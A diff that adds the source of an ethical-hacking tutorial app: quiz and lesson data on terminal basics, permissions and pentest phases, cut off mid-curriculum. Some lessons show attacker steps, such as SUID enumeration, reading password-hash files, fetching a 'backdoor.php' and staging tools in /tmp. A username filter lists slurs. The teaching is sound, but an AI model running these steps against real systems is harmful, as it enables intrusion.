@@ -1,0 +1,1430 @@
+import { useState, useEffect, useCallback, useMemo, useRef } from "react";
+
+/* HackPath v8 — Full Ethical Hacking Learning Platform
+   14 units · 74 levels · Duolingo-style mastery
+   Per-user persistent storage · OS-aware · Sound + Animation */
+
+// Sound Engine
+let _actx = null;
+const actx = () => { if (!_actx) _actx = new (window.AudioContext || window.webkitAudioContext)(); return _actx; };
+const beep = (f, d, t = "sine", v = 0.15) => {
+  try { const c = actx(), o = c.createOscillator(), g = c.createGain(); o.type = t; o.frequency.value = f; g.gain.value = v; o.connect(g); g.connect(c.destination); o.start(); g.gain.exponentialRampToValueAtTime(0.001, c.currentTime + d); o.stop(c.currentTime + d); } catch (e) {}
+};
+const SFX = {
+  correct: () => { beep(523, 0.12); setTimeout(() => beep(659, 0.12), 80); setTimeout(() => beep(784, 0.15), 160); },
+  wrong: () => { beep(200, 0.2, "sawtooth", 0.1); setTimeout(() => beep(150, 0.25, "sawtooth", 0.08), 120); },
+  complete: () => { beep(523, 0.1); setTimeout(() => beep(659, 0.1), 100); setTimeout(() => beep(784, 0.1), 200); setTimeout(() => beep(1047, 0.2), 300); },
+  tap: () => beep(800, 0.05, "sine", 0.05),
+};
+
+// Storage (per-user, persistent)
+const sKey = (u, k) => `hp8-${u}-${k}`;
+const saveP = (u, p) => { try { window.storage?.set(sKey(u, "p"), JSON.stringify(p)); } catch(e){} };
+const loadP = async (u) => { try { const r = await window.storage?.get(sKey(u, "p")); return r ? JSON.parse(r.value) : null; } catch(e){ return null; } };
+const saveOS = (u, o) => { try { window.storage?.set(sKey(u, "os"), JSON.stringify(o)); } catch(e){} };
+const loadOS = async (u) => { try { const r = await window.storage?.get(sKey(u, "os")); return r ? JSON.parse(r.value) : null; } catch(e){ return null; } };
+const saveU = (u, p) => { try { window.storage?.set(sKey(u, "a"), p); } catch(e){} };
+const checkU = async (u) => { try { const r = await window.storage?.get(sKey(u, "a")); return r ? r.value : null; } catch(e){ return null; } };
+const shuffle = (a) => { const b=[...a]; for(let i=b.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[b[i],b[j]]=[b[j],b[i]];} return b; };
+
+// Username profanity filter — blocks slurs without false-flagging normal words
+const BLOCKED_EXACT = ["nigger","nigga","nigg3r","n1gger","n1gga","faggot","f4ggot","fag","kike","k1ke","chink","ch1nk","spic","sp1c","wetback","gook","raghead","towelhead","coon","darkie","beaner","tranny","retard","r3tard"];
+const BLOCKED_SUBSTR = ["nigger","nigga","nigg3r","n1gger","n1gga"];
+const checkUsername = (name) => {
+  const low = name.toLowerCase().replace(/\s+/g, "");
+  if (low.length < 2) return "Username must be at least 2 characters";
+  if (low.length > 24) return "Username must be 24 characters or less";
+  if (!/^[a-zA-Z0-9_.-]+$/.test(name.trim())) return "Letters, numbers, _ . - only";
+  for (const w of BLOCKED_SUBSTR) { if (low.includes(w)) return "That username isn't allowed"; }
+  const words = low.replace(/[_.\-0-9]/g, " ").split(/\s+/);
+  for (const w of words) { if (BLOCKED_EXACT.includes(w)) return "That username isn't allowed"; }
+  return null;
+};
+
+// ═══ CURRICULUM DATA ═══
+// UNITS 1-4: Basics, Terminal Mastery, Linux Deep Dive, Networking
+const UNITS_1_4 = [
+  {
+    id:"u1", title:"The Basics", desc:"What ethical hacking is and how to think like a pentester",
+    levels:[
+      {id:"u1l1",title:"What is Ethical Hacking?",rounds:[
+        {type:"teach",text:"Ethical hacking means being paid to break into systems — legally, with permission. Imagine a bank hiring you to try to rob them so they can find and fix security holes before a real thief does. That's literally the job."},
+        {type:"teach",text:"3 types of hackers: White Hat = the good guys, hired and legal (like a locksmith testing your locks). Black Hat = criminals (burglar breaking in to steal). Grey Hat = picks your lock to show you it's weak but didn't ask first. We're White Hat."},
+        {type:"pick",q:"Which hacker type has written permission to test?",opts:["White Hat","Black Hat","Grey Hat","Script Kiddie"],a:"White Hat",why:"White Hat hackers always get legal authorization before testing."},
+        {type:"tf",q:"Ethical hackers can test any system they want as long as they report the bugs.",a:false,why:"You MUST have written permission (scope agreement) before testing anything. Testing without permission is a crime."},
+        {type:"teach",text:"Before hacking anything, you need paperwork. Scope = a map showing which buildings you can break into. ROE (Rules of Engagement) = what tools you can use. NDA = you keep everything secret. No paperwork = you go to jail. Simple."},
+        {type:"pick",q:"What document defines which systems you're allowed to test?",opts:["NDA","Scope agreement","Resume","Bug report"],a:"Scope agreement",why:"The scope agreement lists exactly which IPs, domains, and systems you may test."},
+        {type:"tf",q:"A Non-Disclosure Agreement (NDA) means you can share findings publicly.",a:false,why:"NDA = Non-Disclosure. You keep everything confidential."}
+      ]},
+      {id:"u1l2",title:"The 5 Phases of Pentesting",rounds:[
+        {type:"teach",text:"Every hack follows 5 steps — think of breaking into a castle: 1) Recon = scout from a distance. 2) Scanning = check every door and window. 3) Exploitation = pick the weakest lock and get in. 4) Post-Exploitation = find the throne room and treasure. 5) Reporting = write down exactly how you got in so they can fix it."},
+        {type:"order",q:"Put the 5 pentest phases in order:",items:["Reconnaissance","Scanning","Exploitation","Post-Exploitation","Reporting"],why:"This order is critical — you never exploit before you scan, and you always report at the end."},
+        {type:"pick",q:"In which phase do you find open ports on the target?",opts:["Reconnaissance","Scanning","Exploitation","Reporting"],a:"Scanning",why:"Scanning uses tools like Nmap to discover open ports and running services."},
+        {type:"teach",text:"Recon has two flavors: Passive = stalking from a distance (Googling them, checking their social media — they have NO idea). Active = walking up and checking doors (scanning their systems — they might notice). Always start passive."},
+        {type:"pick",q:"Looking up a target's WHOIS record is what type of recon?",opts:["Passive","Active","Exploitation","Scanning"],a:"Passive",why:"WHOIS lookups go through a third-party database, not the target directly."},
+        {type:"tf",q:"Post-exploitation happens after you've already gained some level of access.",a:true,why:"Post-exploitation is about what you do AFTER initial access — escalate privileges, move to other systems, exfiltrate data."},
+        {type:"match",q:"Match each phase to its action:",pairs:[["Reconnaissance","Gather target info"],["Scanning","Find open ports"],["Exploitation","Gain access"],["Reporting","Document findings"]],why:"Each phase has a distinct purpose in the methodology."}
+      ]},
+      {id:"u1l3",title:"Setting Up Your Lab",rounds:[
+        {type:"teach",text:"NEVER practice on real websites — that's illegal. Instead, create a practice arena on your own computer using VMs (Virtual Machines). A VM is a fake computer running inside your real one — like a video game training level. You can hack it all day and nothing bad happens.",os:{linux:"Install VirtualBox: sudo apt install virtualbox",windows:"Download VirtualBox from virtualbox.org and run the installer",mac:"Download VirtualBox from virtualbox.org — or use UTM for Apple Silicon Macs"}},
+        {type:"teach",text:"Kali Linux is your hacking toolbox — a special version of Linux with 600+ hacking tools already installed. Like getting a fully loaded spy kit for free. Download from kali.org as a VM image, import into VirtualBox, and you're ready to hack.",os:{linux:"wget the .ova file, then: vboxmanage import kali.ova",windows:"Download .ova file → File → Import Appliance in VirtualBox",mac:"Same process — download .ova and import. On Apple Silicon use the ARM version."}},
+        {type:"pick",q:"What is a hypervisor?",opts:["Software that runs VMs","A type of firewall","A password cracker","A network scanner"],a:"Software that runs VMs",why:"Hypervisors like VirtualBox/VMware let you run multiple operating systems on one physical machine."},
+        {type:"teach",text:"Vulnerable target VMs to practice on: Metasploitable 2/3 (intentionally vulnerable Linux), DVWA (web app with SQL injection, XSS etc), HackTheBox (online CTF platform), TryHackMe (guided learning rooms)."},
+        {type:"pick",q:"Why do we use vulnerable VMs instead of real websites?",opts:["It's legal and safe","They're faster","Real sites are boring","VMs look cooler"],a:"It's legal and safe",why:"Testing on systems without permission is illegal. Vulnerable VMs are designed for practice."},
+        {type:"tf",q:"Kali Linux comes pre-installed with penetration testing tools.",a:true,why:"Kali has 600+ security tools pre-installed — that's its whole purpose."}
+      ]},
+      {id:"u1l4",title:"Mastery Test: The Basics",rounds:[
+        {type:"type",q:"What type of hacker has legal written permission to test systems?",a:["white hat","whitehat","white-hat"],why:"White hat hackers are authorized ethical testers."},
+        {type:"order",q:"Put the pentest phases in correct order:",items:["Reconnaissance","Scanning","Exploitation","Post-Exploitation","Reporting"],why:"The methodology must be followed in order."},
+        {type:"type",q:"What document defines exactly which systems you can legally test?",a:["scope","scope agreement","rules of engagement","roe"],why:"The scope/ROE defines your legal boundaries."},
+        {type:"pick",q:"Checking a target's LinkedIn page is what type of recon?",opts:["Passive","Active","Exploitation","Scanning"],a:"Passive",why:"You're not touching the target's systems — just public info."},
+        {type:"type",q:"Name the popular Debian-based Linux distro made for penetration testing:",a:["kali","kali linux","parrot","parrot os"],why:"Kali Linux is the standard pentesting distro."},
+        {type:"tf",q:"You can legally pentest any website as long as you report the bugs afterward.",a:false,why:"You MUST have written permission BEFORE testing. Reporting doesn't make illegal access legal."},
+        {type:"type",q:"What software lets you run virtual machines on your computer?",a:["virtualbox","vmware","hypervisor","utm","virtual box"],why:"VirtualBox/VMware are the most common hypervisors for lab setups."}
+      ]}
+    ]
+  },
+  {
+    id:"u2", title:"Terminal Mastery", desc:"Navigate any system from the command line",
+    levels:[
+      {id:"u2l1",title:"Your First Commands",rounds:[
+        {type:"teach",text:"The terminal is your hacking cockpit — instead of clicking around, you type commands like texting your computer. Way faster, way more powerful, and most hacking tools ONLY work here. If hacking is driving, the terminal is the steering wheel.",os:{linux:"Open Terminal from your app menu or press Ctrl+Alt+T",windows:"Open PowerShell: right-click Start → Terminal. Or use CMD: Win+R → cmd",mac:"Open Terminal from Applications → Utilities, or press Cmd+Space and type Terminal"}},
+        {type:"teach",text:"pwd — Print Working Directory. Shows where you are right now in the filesystem. Think of it as 'where am I?'",os:{linux:"$ pwd\n/home/kali",windows:"PS> pwd\nC:\\Users\\YourName\n(or use: cd — with no arguments shows current dir)",mac:"$ pwd\n/Users/YourName"}},
+        {type:"type",q:"Type the command to see your current directory location:",a:["pwd","cd"],why:"pwd = Print Working Directory. Shows your current path."},
+        {type:"teach",text:"ls — list files and folders in current directory. Use ls -la to see hidden files (files starting with .) and details like permissions and file sizes.",os:{linux:"$ ls\nDesktop Documents Downloads\n$ ls -la\ntotal 40\ndrwxr-xr-x  5 kali kali 4096 ...",windows:"PS> dir\n(or ls — PowerShell aliases it)\nPS> dir -Force  (shows hidden files)",mac:"$ ls\nDesktop Documents Downloads\n$ ls -la\n(same as Linux)"}},
+        {type:"type",q:"List all files including hidden ones with details:",a:["ls -la","ls -al","ls -a -l","dir -force","dir -Force"],why:"ls -la shows hidden files (.) and detailed info like permissions and sizes."},
+        {type:"teach",text:"cd — change directory. cd Desktop moves into Desktop. cd .. goes up one level. cd ~ goes to your home directory. cd / goes to the root of the filesystem.",os:{linux:"$ cd /etc\n$ pwd\n/etc\n$ cd ~\n$ pwd\n/home/kali",windows:"PS> cd C:\\Users\nPS> cd ..\nPS> cd ~  (goes to home in PowerShell)",mac:"$ cd /etc\n$ pwd\n/etc\n$ cd ~\n$ pwd\n/Users/YourName"}},
+        {type:"type",q:"Go up one directory level:",a:["cd ..","cd.."],why:"cd .. moves to the parent directory."},
+        {type:"pick",q:"What does cd ~ do?",opts:["Goes to home directory","Goes to root /","Lists files","Goes up one level"],a:"Goes to home directory",why:"~ is a shortcut for your home directory (/home/username on Linux)."}
+      ]},
+      {id:"u2l2",title:"Creating & Managing Files",rounds:[
+        {type:"teach",text:"touch filename — creates an empty file. mkdir dirname — creates a directory (folder).",os:{linux:"$ touch notes.txt\n$ mkdir projects",windows:"PS> New-Item notes.txt -ItemType File\nPS> mkdir projects\n(or: ni notes.txt)",mac:"$ touch notes.txt\n$ mkdir projects"}},
+        {type:"type",q:"Create an empty file called scan.txt:",a:["touch scan.txt","ni scan.txt","New-Item scan.txt"],why:"touch creates empty files. On Windows use New-Item or ni."},
+        {type:"type",q:"Create a new directory called targets:",a:["mkdir targets"],why:"mkdir = make directory."},
+        {type:"teach",text:"cp — copy files. mv — move (or rename) files. rm — delete files. rm -r — delete directories recursively.",os:{linux:"$ cp scan.txt backup.txt   # copy\n$ mv scan.txt recon/       # move\n$ mv old.txt new.txt       # rename\n$ rm backup.txt            # delete file\n$ rm -r old_folder/        # delete folder",windows:"PS> cp scan.txt backup.txt\nPS> mv scan.txt recon\\\nPS> rm backup.txt\nPS> rm -r old_folder\\  (or: Remove-Item -Recurse)",mac:"Same as Linux — cp, mv, rm, rm -r"}},
+        {type:"type",q:"Copy file results.txt to backup.txt:",a:["cp results.txt backup.txt","copy results.txt backup.txt"],why:"cp source destination copies a file."},
+        {type:"type",q:"Delete a directory called temp and everything inside it:",a:["rm -r temp","rm -r temp/","rm -rf temp","rm -rf temp/","Remove-Item -Recurse temp"],why:"rm -r = remove recursively. Without -r, rm won't delete directories."},
+        {type:"teach",text:"cat filename — displays file contents. less filename — scrollable viewer (q to quit). head/tail — show first/last 10 lines.",os:{linux:"$ cat /etc/passwd\nroot:x:0:0:...\n$ head -5 /etc/passwd  # first 5 lines\n$ tail -3 /var/log/syslog  # last 3 lines",windows:"PS> cat notes.txt  (or: Get-Content notes.txt)\nPS> Get-Content notes.txt -Head 5\nPS> Get-Content notes.txt -Tail 3",mac:"Same as Linux — cat, head, tail, less"}},
+        {type:"type",q:"Display the contents of a file called config.txt:",a:["cat config.txt","less config.txt","Get-Content config.txt","type config.txt"],why:"cat prints file contents to the terminal."},
+        {type:"pick",q:"Which command shows only the last 10 lines of a file?",opts:["tail","head","cat","less"],a:"tail",why:"tail shows the end of a file. tail -n 20 shows last 20 lines."}
+      ]},
+      {id:"u2l3",title:"Finding Things",rounds:[
+        {type:"teach",text:"find — search for files by name, type, size, etc. This is one of the most powerful commands.",os:{linux:"$ find / -name passwords.txt\n$ find /home -type f -name '*.conf'\n$ find / -perm -4000  # find SUID files (important for hacking!)",windows:"PS> Get-ChildItem -Recurse -Filter passwords.txt\nPS> Get-ChildItem C:\\ -Recurse -Include *.conf",mac:"Same as Linux find command"}},
+        {type:"type",q:"Find all files named secret.txt starting from root:",a:["find / -name secret.txt","find / -name 'secret.txt'","Get-ChildItem -Recurse -Filter secret.txt"],why:"find / -name filename searches the entire filesystem."},
+        {type:"teach",text:"grep — search inside files for text patterns. One of the most used commands in hacking. grep -r searches recursively through directories. grep -i is case-insensitive.",os:{linux:"$ grep 'password' config.txt\n$ grep -r 'admin' /var/www/\n$ grep -i 'secret' *.txt",windows:"PS> Select-String 'password' config.txt\nPS> Get-ChildItem -Recurse | Select-String 'admin'",mac:"Same as Linux grep"}},
+        {type:"type",q:"Search for the word 'root' inside /etc/passwd:",a:["grep root /etc/passwd","grep 'root' /etc/passwd","cat /etc/passwd | grep root"],why:"grep pattern file searches for text matches inside a file."},
+        {type:"build",q:"Build a command to recursively search all .log files for the word 'error':",parts:["grep","-r","-i","'error'","*.log","/var/log/"],answer:["grep","-r","-i","'error'","/var/log/"],why:"grep -r -i 'error' /var/log/ searches all files under /var/log for 'error' case-insensitively."},
+        {type:"teach",text:"which / whereis — find where a program is installed. which nmap tells you the path to the nmap binary.",os:{linux:"$ which nmap\n/usr/bin/nmap\n$ whereis python3\npython3: /usr/bin/python3 /usr/lib/python3",windows:"PS> Get-Command nmap\nPS> where.exe nmap",mac:"$ which nmap\n/opt/homebrew/bin/nmap"}},
+        {type:"type",q:"Find where the program 'hydra' is installed:",a:["which hydra","whereis hydra","where hydra","Get-Command hydra","where.exe hydra"],why:"which shows the full path to an executable."}
+      ]},
+      {id:"u2l4",title:"Pipes & Redirection",rounds:[
+        {type:"teach",text:"Pipes ( | ) send output from one command into another command. This lets you chain commands together. Example: ls | grep txt — list files then filter for ones containing 'txt'."},
+        {type:"type",q:"List files and filter for ones containing 'scan':",a:["ls | grep scan","ls | grep 'scan'","dir | Select-String scan"],why:"pipe (|) sends ls output into grep to filter it."},
+        {type:"teach",text:"Redirection: > sends output to a file (overwrites). >> appends to a file. Example: nmap 10.0.0.1 > results.txt saves scan results to a file.",os:{linux:"$ echo 'hello' > file.txt   # overwrite\n$ echo 'world' >> file.txt  # append\n$ cat file.txt\nhello\nworld",windows:"Same syntax in PowerShell: > and >> work",mac:"Same as Linux"}},
+        {type:"type",q:"Save the output of 'whoami' to a file called user.txt:",a:["whoami > user.txt"],why:"> redirects command output into a file."},
+        {type:"pick",q:"What's the difference between > and >>?",opts:["> overwrites, >> appends","> appends, >> overwrites","Both overwrite","Both append"],a:"> overwrites, >> appends",why:"> creates/overwrites the file. >> adds to the end without erasing."},
+        {type:"teach",text:"Powerful combos: cat /etc/passwd | grep bash | cut -d: -f1 — this reads the passwd file, filters for users with bash shell, then extracts just the usernames. Each | passes output to the next command."},
+        {type:"build",q:"Build: Read passwd, find 'bash' users, extract usernames:",parts:["cat /etc/passwd","|","grep bash","|","cut -d: -f1"],answer:["cat /etc/passwd","|","grep bash","|","cut -d: -f1"],why:"This chain reads the file, filters for bash users, then cuts out field 1 (username) using : as delimiter."}
+      ]},
+      {id:"u2l5",title:"Process Management",rounds:[
+        {type:"teach",text:"ps — shows running processes. ps aux shows ALL processes with details. top/htop gives a live view. kill PID stops a process. kill -9 PID force kills it.",os:{linux:"$ ps aux\nUSER  PID  %CPU  %MEM  COMMAND\nroot    1   0.0   0.1  /sbin/init\nkali  1337  2.5   1.2  nmap 10.0.0.1",windows:"PS> Get-Process\nPS> Stop-Process -Id 1337\n(or use Task Manager: Ctrl+Shift+Esc)",mac:"$ ps aux  (same as Linux)\n$ kill 1337\n(or Activity Monitor app)"}},
+        {type:"type",q:"Show all running processes with details:",a:["ps aux","ps -aux","ps -ef","Get-Process","tasklist"],why:"ps aux shows every process with user, PID, CPU%, and command."},
+        {type:"teach",text:"Background processes: Add & to run a command in the background. jobs lists background jobs. fg brings one back to foreground. This is crucial during pentests when you need multiple tools running.",os:{linux:"$ nmap 10.0.0.1 &\n[1] 4521\n$ jobs\n[1]+  Running  nmap 10.0.0.1 &\n$ fg 1",windows:"PS> Start-Process nmap -ArgumentList '10.0.0.1'\n(or use Start-Job for background jobs)",mac:"Same as Linux — &, jobs, fg"}},
+        {type:"type",q:"Kill process with PID 4521:",a:["kill 4521","kill -9 4521","Stop-Process -Id 4521","taskkill /PID 4521"],why:"kill PID sends a termination signal to that process."},
+        {type:"pick",q:"What does & at the end of a command do?",opts:["Runs it in background","Runs it as root","Runs it twice","Pipes output"],a:"Runs it in background",why:"& backgrounds the process so you can keep using the terminal."}
+      ]},
+      {id:"u2l6",title:"Text Power Tools",rounds:[
+        {type:"teach",text:"cut — extract specific fields from text. cut -d: -f1 /etc/passwd extracts usernames (field 1, delimiter :). cut -d',' -f2 extracts the second CSV column."},
+        {type:"type",q:"Extract field 3 from a colon-separated file data.txt:",a:["cut -d: -f3 data.txt","cut -d ':' -f3 data.txt"],why:"cut -d: sets the delimiter, -f3 selects field 3."},
+        {type:"teach",text:"sort — sorts lines. uniq — removes duplicates (must be sorted first). wc — counts lines/words/bytes. wc -l counts lines only. Combo: sort file.txt | uniq -c | sort -rn — shows unique lines with count, sorted by frequency."},
+        {type:"type",q:"Count the number of lines in access.log:",a:["wc -l access.log","cat access.log | wc -l"],why:"wc -l counts lines in a file."},
+        {type:"teach",text:"awk — powerful text processing. awk '{print $1}' prints the first column (space-separated). awk -F: '{print $1,$7}' /etc/passwd prints username and shell. sed — stream editor for find/replace: sed 's/old/new/g' file.txt"},
+        {type:"build",q:"Build: extract IPs (column 1) from access.log and count unique ones:",parts:["awk '{print $1}'","access.log","|","sort","|","uniq -c","|","sort -rn"],answer:["awk '{print $1}'","access.log","|","sort","|","uniq -c","|","sort -rn"],why:"Extract IPs → sort → count unique → sort by frequency descending."},
+        {type:"type",q:"Replace all instances of 'http' with 'https' in urls.txt:",a:["sed 's/http/https/g' urls.txt","sed 's/http/https/g' urls.txt > new.txt"],why:"sed 's/old/new/g' does global find-and-replace."}
+      ]},
+      {id:"u2lab",title:"LAB: Find the Flag",rounds:[
+        {type:"lab",title:"Filesystem Treasure Hunt",objective:"Navigate the Linux filesystem and find the hidden flag file on a remote server.",
+          banner:"Connected to target: 10.10.10.42\nOS: Ubuntu 20.04 LTS\nUser: www-data\n$ whoami\nwww-data\n",
+          steps:[
+            {hint:"First, check where you are. Print your current directory.",accept:["pwd"],output:"/var/www/html",successMsg:"You're in the web root.",example:"pwd",placeholder:"Where are you?",quickCmds:["pwd","ls","whoami"]},
+            {hint:"List all files here, including hidden ones.",accept:["ls -la","ls -al","ls -a"],output:"total 24\ndrwxr-xr-x  3 www-data www-data 4096 .\ndrwxr-xr-x  3 root     root     4096 ..\n-rw-r--r--  1 www-data www-data  612 index.html\n-rw-r--r--  1 www-data www-data   44 .secret_note\ndrwxr-xr-x  2 www-data www-data 4096 backup",successMsg:"Found a hidden file: .secret_note!",example:"ls -la",quickCmds:["ls -la","ls -a","ls"]},
+            {hint:"Read the hidden note to get a clue.",accept:["cat .secret_note","less .secret_note"],output:"The flag is hidden somewhere in /opt. Look carefully...",successMsg:"The flag is in /opt!",example:"cat .secret_note",quickCmds:["cat .secret_note"]},
+            {hint:"Navigate to /opt and look around.",accept:["cd /opt","~cd /opt"],output:"",successMsg:"Moved to /opt.",wrongMsg:"Use cd to change directory.",example:"cd /opt",quickCmds:["cd /opt","ls /opt"]},
+            {hint:"Search for any file containing 'flag' in /opt.",accept:["find /opt -name '*flag*'","~find /opt","find . -name '*flag*'","ls -la /opt","ls -R /opt"],output:"/opt/.hidden/configs/flag.txt",successMsg:"Found it!",example:"find /opt -name '*flag*'",quickCmds:["find /opt -name '*flag*'","ls -R /opt"]},
+            {hint:"Read the flag file!",accept:["cat /opt/.hidden/configs/flag.txt","~cat /opt/.hidden","~cat flag.txt"],output:"FLAG{y0u_f0und_th3_h1dd3n_fl4g}\n\n[+] Great work! You navigated the filesystem, found hidden files, and located the flag.",successMsg:"Flag captured!",example:"cat /opt/.hidden/configs/flag.txt",quickCmds:["cat /opt/.hidden/configs/flag.txt"]},
+          ]},
+      ]},
+      {id:"u2l7",title:"Mastery Test: Terminal",rounds:[
+        {type:"type",q:"Show your current directory path:",a:["pwd","cd"],why:"pwd = Print Working Directory."},
+        {type:"type",q:"List all files including hidden ones:",a:["ls -la","ls -al","ls -a","dir -Force"],why:"ls -la shows everything including dotfiles."},
+        {type:"type",q:"Find all files named 'flag.txt' on the entire system:",a:["find / -name flag.txt","find / -name 'flag.txt'"],why:"find / -name searches from root."},
+        {type:"type",q:"Search for 'password' in all files under /var/www recursively:",a:["grep -r password /var/www","grep -r 'password' /var/www/","grep -r 'password' /var/www","grep -ri password /var/www"],why:"grep -r searches recursively through directories."},
+        {type:"type",q:"Save nmap output to a file called scan.txt:",a:["nmap > scan.txt","nmap 10.0.0.1 > scan.txt"],why:"> redirects command output to a file."},
+        {type:"type",q:"Extract just usernames (field 1) from /etc/passwd:",a:["cut -d: -f1 /etc/passwd","awk -F: '{print $1}' /etc/passwd","cut -d ':' -f1 /etc/passwd"],why:"cut -d: -f1 extracts the first colon-separated field."},
+        {type:"type",q:"Force kill process 5891:",a:["kill -9 5891","kill -SIGKILL 5891","Stop-Process -Id 5891 -Force"],why:"kill -9 sends SIGKILL — the process cannot ignore it."},
+        {type:"type",q:"Count unique lines in a file and sort by frequency:",a:["sort file.txt | uniq -c | sort -rn","sort | uniq -c | sort -rn","cat file.txt | sort | uniq -c | sort -rn"],why:"sort → uniq -c → sort -rn is the classic frequency analysis pipeline."}
+      ]}
+    ]
+  },
+  {
+    id:"u3", title:"Linux Deep Dive", desc:"Permissions, users, filesystems, and system networking",
+    levels:[
+      {id:"u3l1",title:"File Permissions",rounds:[
+        {type:"teach",text:"Every file has a bouncer. It checks 3 things: can you Read it (4 points), Write to it (2 points), or Run it (1 point)? And checks 3 groups: Owner, Group, Everyone Else. Add points: 7=full access, 5=read+run, 4=read only. So -rwxr-xr-- means the owner has full power, group can read+run, everyone else can only look."},
+        {type:"teach",text:"chmod changes permissions. You can use numbers: chmod 755 file (rwxr-xr-x) or symbols: chmod u+x file (add execute for user). Common: 777 = everyone full access, 644 = owner read/write, others read only, 600 = owner only."},
+        {type:"pick",q:"What does chmod 644 mean?",opts:["Owner rw, group r, others r","Everyone full access","Owner only read","No permissions"],a:"Owner rw, group r, others r",why:"6=rw(4+2), 4=r, 4=r. Owner read+write, everyone else read only."},
+        {type:"type",q:"Make script.sh executable for the owner:",a:["chmod u+x script.sh","chmod +x script.sh","chmod 755 script.sh","chmod 700 script.sh"],why:"chmod u+x adds execute permission for the file owner."},
+        {type:"fillin",q:"chmod ___ gives everyone full read/write/execute access:",a:["777"],why:"7=rwx for each group: owner(7) group(7) others(7)."},
+        {type:"teach",text:"SUID is like finding a master key lying on the ground. Normally programs run with YOUR weak permissions. But SUID programs run as the OWNER — usually root (the king). So if you trick a root-owned SUID program, you get the king's power. Like finding a royal stamp that says "whoever holds this has my authority." Find them: find / -perm -4000"},
+        {type:"type",q:"Find all SUID files on the system:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null","find / -perm -u=s"],why:"SUID files run as their owner — if owned by root, they're privilege escalation targets."},
+        {type:"tf",q:"A SUID binary owned by root will execute with root privileges even when run by a normal user.",a:true,why:"That's exactly what SUID does — the binary runs as the file owner, not the person executing it."}
+      ]},
+      {id:"u3l2",title:"Users & Authentication",rounds:[
+        {type:"teach",text:"/etc/passwd = the guest list (who's allowed in the building). /etc/shadow = the safe with all the password hashes (only the boss can open it). /etc/group = the team rosters (who belongs to which group). These 3 files are your treasure map after breaking in.",os:{linux:"$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000::/home/kali:/bin/bash",windows:"Users stored in SAM database (C:\\Windows\\System32\\config\\SAM)\nView users: net user",mac:"Uses Directory Services. View users: dscl . list /Users"}},
+        {type:"pick",q:"Where are Linux password hashes stored?",opts:["/etc/shadow","/etc/passwd","/etc/hashes","/var/log/auth"],a:"/etc/shadow",why:"/etc/shadow stores hashed passwords and is only readable by root."},
+        {type:"teach",text:"sudo — run a command as root. sudo su switches to root user. whoami shows current user. id shows user ID and groups. Users with sudo access are in the sudo or wheel group."},
+        {type:"type",q:"Check what user you're currently logged in as:",a:["whoami","id","echo $USER"],why:"whoami prints your current username."},
+        {type:"type",q:"Switch to the root user:",a:["sudo su","sudo su -","su root","sudo -i"],why:"sudo su switches to root shell."},
+        {type:"teach",text:"Adding users: useradd newuser creates a user. passwd newuser sets their password. usermod -aG sudo newuser adds them to sudo group. userdel newuser removes them."},
+        {type:"pick",q:"Which command adds a user to the sudo group?",opts:["usermod -aG sudo user","useradd -sudo user","chmod sudo user","passwd -sudo user"],a:"usermod -aG sudo user",why:"usermod -aG appends the user to the specified group."}
+      ]},
+      {id:"u3l3",title:"Filesystem Layout",rounds:[
+        {type:"teach",text:"Linux filesystem is a tree starting at / (root). Key directories: /etc = config files, /var = variable data (logs), /tmp = temporary files (world-writable!), /home = user directories, /opt = optional software, /bin & /usr/bin = executables, /proc = live kernel/process info."},
+        {type:"match",q:"Match directories to their purpose:",pairs:[["/etc","Configuration files"],["/var/log","System logs"],["/tmp","Temporary files (writable by all)"],["/home","User home directories"]],why:"Knowing the filesystem layout is essential for finding useful files during a pentest."},
+        {type:"teach",text:"Files hackers care about: /etc/passwd (users), /etc/shadow (password hashes), /etc/hosts (DNS overrides), /var/www/ (web files), /var/log/ (logs that track your activity), /tmp (drop your tools here — anyone can write), /root/ (root's home), ~/.bash_history (command history)."},
+        {type:"pick",q:"Which directory is world-writable and useful for dropping tools?",opts:["/tmp","/root","/etc","/bin"],a:"/tmp",why:"/tmp is writable by all users — attackers use it to stage payloads."},
+        {type:"type",q:"Where would you find Apache web server files?",a:["/var/www","/var/www/html","/var/www/"],why:"Web files are typically in /var/www/html on Linux."},
+        {type:"tf",q:"/proc contains live information about running processes and the kernel.",a:true,why:"/proc is a virtual filesystem — files like /proc/version show kernel info, /proc/PID/ shows process details."}
+      ]},
+      {id:"u3l4",title:"Networking Commands",rounds:[
+        {type:"teach",text:"ifconfig or ip addr — show your IP address and network interfaces. Critical to know your own IP when pentesting.",os:{linux:"$ ip addr\n2: eth0: inet 192.168.1.105/24\n$ ifconfig  (older systems)",windows:"PS> ipconfig\nEthernet adapter: IPv4 Address: 192.168.1.105",mac:"$ ifconfig\nen0: inet 192.168.1.105"}},
+        {type:"type",q:"Show your IP address and network interfaces:",a:["ip addr","ifconfig","ip a","ipconfig"],why:"ip addr (Linux) or ipconfig (Windows) shows your network configuration."},
+        {type:"teach",text:"ping — test if a host is alive. netstat or ss — show active connections and listening ports. ss -tlnp shows all TCP listening ports with process names. route or ip route — show routing table.",os:{linux:"$ ping 10.0.0.1\n$ ss -tlnp\nLISTEN  0  128  0.0.0.0:22  users:((\"sshd\",pid=1234))\n$ ip route",windows:"PS> ping 10.0.0.1\nPS> netstat -an\nPS> route print",mac:"$ ping 10.0.0.1\n$ netstat -an\n$ netstat -rn"}},
+        {type:"type",q:"Check which ports are listening on your machine:",a:["ss -tlnp","netstat -tlnp","netstat -an","ss -lntp"],why:"ss -tlnp shows TCP listening ports with process info."},
+        {type:"type",q:"Test if host 10.10.10.5 is alive:",a:["ping 10.10.10.5","ping -c 4 10.10.10.5"],why:"ping sends ICMP echo requests to check if a host responds."},
+        {type:"teach",text:"curl and wget — download files and interact with web servers from the terminal. curl http://target.com shows the HTML source. wget http://target.com/file.zip downloads files. curl -v shows verbose HTTP headers.",os:{linux:"$ curl http://10.0.0.1\n<html>...</html>\n$ wget http://10.0.0.1/backdoor.php\n$ curl -v http://10.0.0.1  # see headers",windows:"PS> Invoke-WebRequest http://10.0.0.1\nPS> curl http://10.0.0.1  (curl is aliased in modern Windows)",mac:"Same as Linux — curl and wget"}},
+        {type:"type",q:"Download the web page at http://10.10.10.5 and see its source:",a:["curl http://10.10.10.5","wget http://10.10.10.5","curl 10.10.10.5"],why:"curl fetches and displays web content from the terminal."}
+      ]},
+      {id:"u3l5",title:"Mastery Test: Linux Deep Dive",rounds:[
